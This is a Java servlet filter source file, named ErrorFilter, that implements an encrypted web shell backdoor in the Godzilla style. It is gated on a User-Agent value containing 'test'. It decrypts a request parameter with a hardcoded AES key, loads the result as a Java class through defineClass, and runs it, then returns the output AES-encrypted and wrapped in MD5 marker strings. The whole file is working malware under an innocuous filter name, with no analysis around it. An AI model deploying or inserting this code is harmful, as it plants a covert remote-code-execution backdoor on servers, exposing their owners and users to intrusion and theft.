import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class ErrorFilter extends ClassLoader implements Filter {
    public String key = "3c6e0b8a9c15224a";
    public String pass = "pass";
    public String md5 = "11CD6A87589841636C37AC826A2A04BC";
    public String headerName = "User-Agent";
    public String headerValue = "test";

    public ErrorFilter() {
    }

    public ErrorFilter(ClassLoader var1) {
        super(var1);
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = base64.newInstance();
                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static byte[] base64Decode(String bs) {
        byte[] value = null;

        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var61) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(this.key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var41) {
            return null;
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(this.pass));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new ErrorFilter(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();

                    Object f;
                    try {
                        f = ((Class) session.getAttribute("payload")).newInstance();
                    } catch (Exception e) {
                        throw new RuntimeException(e);
                    }

                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(this.md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(this.md5.substring(16));
                }
            } else {
                chain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception var12) {
            chain.doFilter(servletRequest, servletResponse);
        }

    }

    @Override
    public void destroy() {

    }
}
